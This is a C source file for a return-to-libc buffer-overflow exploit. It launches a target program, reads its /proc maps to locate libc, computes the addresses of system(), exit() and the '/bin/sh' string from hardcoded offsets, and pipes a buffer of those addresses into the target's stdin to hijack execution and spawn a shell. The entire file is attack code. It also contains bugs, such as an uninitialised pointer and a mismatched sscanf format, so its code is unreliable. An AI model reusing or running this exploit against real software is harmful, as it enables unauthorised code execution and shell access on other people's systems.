#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <sys/resource.h>
#include <sys/ptrace.h>

static off_t const exitofft   = 0x2de10;
static off_t const systemofft = 0x380b0;
static off_t const binshofft  = 0x1243ff;

static unsigned long exitvaddr      = 0x2de10;
static unsigned long systemvaddr    = 0x380b0;
static unsigned long binshvaddr     = 0x1243ff;


static FILE* ril_open_map_file(pid_t pid)
{
        FILE *ret;
        char buff[20];

        snprintf(buff, sizeof(buff), "/proc/%u/maps", pid);
        printf("opening %s file\n", buff);

        ret = fopen(buff, "r+");
        if(ret == NULL){
                perror("fopen :");
                return ret;
        }
        return ret;

}

static void ril_close_map_file(FILE *fp)
{
        if(fp){
                fclose(fp);
        }
}

static int ril_matchline_map_file(char *const line)
{
        char useless[128], perm[5];
        unsigned long start_vaddr;
        puts(line);
        if(strstr(line, "libc-") == NULL){
                return 0;
        }

        sscanf(line, "%x-%s %s %s %s %s %s",
                (unsigned long *)&start_vaddr, 
                useless, 
                perm,
                useless,
                useless,
                useless,
                useless,
                useless);
        if(perm[2] == 'x') {
                exitvaddr   += start_vaddr;
                systemvaddr += start_vaddr;
                binshvaddr  += start_vaddr;
        }
        return 1;
}


static int ril_read_map_file(FILE *fp)
{
        char line[512];
        if(!fp){
                return;
        }
        while(fgets(line, sizeof(line), fp)){
            if(ril_matchline_map_file(line)) {
                    printf("%lx %lx %lx\n", 
                            exitvaddr,
                            systemvaddr,
                            binshvaddr);
                    return 1;
            }
        }
        return 0;
}

void ril_make_buffer(char **buffer, pid_t pid, size_t noplen)
{
        size_t i, alloclen = noplen + 3 * sizeof(unsigned long) + 2;
        *buffer = calloc(alloclen, sizeof(char));
        unsigned long *ptr;


        while((ptr) < (*buffer) + alloclen - 3 * (sizeof(unsigned long))){
            *ptr++ = systemvaddr;
            *ptr++ = exitvaddr;
            *ptr++ = binshvaddr;
        }
}


int main(int argc, char *argv[])
{
        FILE    *fp;
        pid_t   pid;
        size_t  bufflen;
        int     fdpipe[2];
        char    *buffer = NULL;

        if(argc != 3){
                fprintf(stderr, "usage : %s <appzname> <buffsize>\n", *argv);
                return -1;
        }

        pipe(fdpipe);

        pid = fork();
        if(pid < 0) {
                perror("fork : ");
                return -1;
        }

        if(pid == 0) {
                // redirect stdin
                nice(19);
                setpriority(PRIO_PROCESS, 0, 19);
                dup2(fdpipe[0], STDIN_FILENO);
                close(fdpipe[1]);
                ptrace(PTRACE_TRACEME, 0, 0, 0);
                execl(argv[1], argv[1], NULL);
                exit(1);
        } else {
                setpriority(PRIO_PROCESS, 0, -15);
                fp = ril_open_map_file(pid);
                if(ril_read_map_file(fp)) {
                        ril_make_buffer(&buffer, pid, atoi(argv[2]));
                }
                ril_close_map_file(fp);
                dup2(fdpipe[1], STDOUT_FILENO);
                printf(buffer);
                free(buffer);
                close(fdpipe[0]);
                
                wait(NULL);
        }

        return 0;
}
